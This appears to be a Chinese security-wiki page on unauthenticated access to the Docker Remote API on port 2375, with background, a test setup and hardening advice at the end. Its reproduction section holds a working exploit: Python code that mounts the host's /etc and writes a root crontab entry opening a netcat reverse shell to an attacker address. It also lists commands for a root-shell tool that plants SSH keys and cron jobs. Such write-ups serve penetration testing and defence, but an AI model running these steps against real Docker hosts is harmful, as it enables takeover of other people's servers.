<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Docker/Docker%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Docker 未授权访问 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Docker \u672a\u6388\u6743\u8bbf\u95ee", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u5f71\u54cd\u8303\u56f4", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-14271）Docker copy漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-link">
        Docker 容器逃逸漏洞 (CVE-2020-15257)复现
      </a>
    </div>
    
  </div>

    

    <h1 id="docker">Docker 未授权访问<a class="headerlink" href="#docker" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h4 id="1">1. 基础介绍<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
<p><a href="http://www.loner.fm/drops/">http://www.loner.fm/drops/</a>##!/drops/1203.%E6%96%B0%E5%A7%BF%E5%8A%BF%E4%B9%8BDocker%20Remote%20API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%88%A9%E7%94%A8</p>
<p>docker swarm 是一个将docker集群变成单一虚拟的docker
host工具，使用标准的Docker
API，能够方便docker集群的管理和扩展，由docker官方提供，具体的大家可以看官网介绍。</p>
<p>漏洞发现的起因是，有一位同学在使用docker swarm的时候，发现了管理的docker
节点上会开放一个TCP端口2375，绑定在0.0.0.0上，http访问会返回 404 page
not found ，然后他研究了下，发现这是 Docker Remote
API，可以执行docker命令，比如访问 <a href="http://host:2375/containers/json">http://host:2375/containers/json</a>
会返回服务器当前运行的 container列表，和在docker CLI上执行 docker ps
的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成，然后他就开始吐槽了，这尼玛太不安全了。</p>
<p>然后我想了想
swarm是用来管理docker集群的，应该放在内网才对。问了之后发现，他是在公网上的几台机器上安装swarm的，并且2375端口的访问策略是开放的，所以可以直接访问。</p>
<h4 id="2">2. 测试环境配置<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
<p>先关闭docker，然后开启：</p>
<div class="codehilite"><pre><span></span><code><span class="n">sudo</span><span class="w"> </span><span class="n">service</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="n">stop</span>
<span class="c1"># 绑定Docker Remote Api在指定端口（这里是2375），可以自行测试。</span>
<span class="n">sudo</span><span class="w"> </span><span class="n">docker</span><span class="w"> </span><span class="n">daemon</span><span class="w">  </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">tcp</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">2375</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="n">unix</span><span class="p">:</span><span class="o">///</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="o">.</span><span class="n">sock</span>
</code></pre></div>

<p>参考API规范进行渗透：<a href="https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/">https://docs.docker.com/engine/reference/api/docker-remote-api-v1.23/</a></p>
<p>操作Docker API可以使用python dockert api 完成。</p>
<p>pip install docker-py</p>
<p>API使用参考：<a href="https://docker-py.readthedocs.io/en/stable/api/">https://docker-py.readthedocs.io/en/stable/api/</a>##client-api</p>
<h2 id="_2">二、影响范围<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>利用方法是，我们随意启动一个容器，并将宿主机的/etc目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入crontab配置文件，进行反弹shell。</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">docker</span>

<span class="n">client</span> <span class="o">=</span> <span class="n">docker</span><span class="o">.</span><span class="n">DockerClient</span><span class="p">(</span><span class="n">base_url</span><span class="o">=</span><span class="s1">&#39;http://your-ip:2375/&#39;</span><span class="p">)</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">containers</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s1">&#39;alpine:latest&#39;</span><span class="p">,</span> <span class="sa">r</span><span class="s1">&#39;&#39;&#39;sh -c &quot;echo &#39;* * * * * /usr/bin/nc your-ip 21 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontabs/root&quot; &#39;&#39;&#39;</span><span class="p">,</span> <span class="n">remove</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">volumes</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;/etc&#39;</span><span class="p">:</span> <span class="p">{</span><span class="s1">&#39;bind&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp/etc&#39;</span><span class="p">,</span> <span class="s1">&#39;mode&#39;</span><span class="p">:</span> <span class="s1">&#39;rw&#39;</span><span class="p">}})</span>
</code></pre></div>

<p>写入crontab文件，成功反弹shell：<img alt="" src="../resource/Docker%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/media/rId26.png" /></p>
<h4 id="python">python脚本<a class="headerlink" href="#python" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/ianxtianxt/docker">https://github.com/ianxtianxt/docker</a>_api_vul</p>
<ul>
<li>
<p>安装类库    <code>pip install -r requirements.txt</code></p>
</li>
<li>
<p>查看运行的容器    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375</code></p>
</li>
<li>
<p>查看所有的容器    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -a</code></p>
</li>
<li>
<p>查看所有镜像    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -l</code></p>
</li>
<li>
<p>查看端口映射    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -L</code></p>
</li>
<li>
<p>写计划任务（centos,redhat等,加-u参数用于ubuntu等）    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -H 反弹ip -P 反弹端口</code>    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -u -i 镜像名 -H 反弹ip -P 反弹端口</code></p>
</li>
<li>
<p>写sshkey(自行修改脚本的中公钥)    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -C -i 镜像名 -k</code></p>
</li>
<li>
<p>在容器中执行命令    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -e  "id" -I 容器id</code></p>
</li>
<li>
<p>删除容器    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -c -I 容器id</code></p>
</li>
<li>
<p>修改client api版本    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -v 1.22</code></p>
</li>
<li>
<p>查看服务端api版本    <code>python dockerRemoteApiGetRootShell.py -h 127.0.0.1 -p 2375 -V</code></p>
</li>
</ul>
<h4 id="33-exp">3.3 其他的一些exp<a class="headerlink" href="#33-exp" title="Permanent link">&para;</a></h4>
<p><a href="https://github.com/netxfly/docker-remote-api-exphttps://github.com/zer0yu/SomePoC/blob/master/Docker/Docker">https://github.com/netxfly/docker-remote-api-exphttps://github.com/zer0yu/SomePoC/blob/master/Docker/Docker</a>_Remote_API%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.pyhttps://github.com/JnuSimba/MiscSecNotes/tree/master/Docker%E5%AE%89%E5%85%A8</p>
<h4 id="4">4. 防护策略<a class="headerlink" href="#4" title="Permanent link">&para;</a></h4>
<ul>
<li>
<p>1.修改 Docker Remote API 服务默认参数。注意：该操作需要重启 Docker
    服务才能生效。</p>
</li>
<li>
<p>2.修改 Docker 的启动参数：    定位到 DOCKER_OPTS 中的
    tcp://0.0.0.0:2375，将0.0.0.0修改为127.0.0.1    或将默认端口 2375 改为自定义端口    为 Remote API 设置认证措施。参照 官方文档 配置 Rem</p>
</li>
<li>
<p>3.注意：该操作需要重启 Docker 服务才能生效。    修改 Docker 服务运行账号。请以较低权限账号运行 Docker
    服务；另外，可以限制攻击者执行高危命令。</p>
</li>
<li>
<p>4.注意：该操作需要重启 Docker 服务才能生效。    设置防火墙策略。如果正常业务中 API
    服务需要被其他服务器来访问，可以配置安全组策略或 iptables
    策略，仅允许指定的 IP 来访问 Docker 接口。</p>
</li>
</ul>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2019-14271%EF%BC%89Docker%20copy%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-14271）Docker copy漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Docker%20%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E%20%28CVE-2020-15257%29%E5%A4%8D%E7%8E%B0/" class="btn btn-xs btn-link">
        Docker 容器逃逸漏洞 (CVE-2020-15257)复现
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>